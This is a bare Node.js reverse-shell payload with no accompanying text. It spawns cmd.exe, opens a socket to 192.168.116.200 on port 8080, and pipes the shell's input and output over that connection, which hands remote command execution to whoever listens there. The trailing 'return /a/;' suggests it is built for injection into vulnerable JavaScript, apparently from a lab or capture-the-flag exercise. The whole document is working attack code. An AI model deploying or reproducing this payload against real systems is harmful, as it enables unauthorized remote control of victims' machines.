var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("cmd.exe", []);
var client = new net.Socket();
client.connect(8080, "192.168.116.200", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
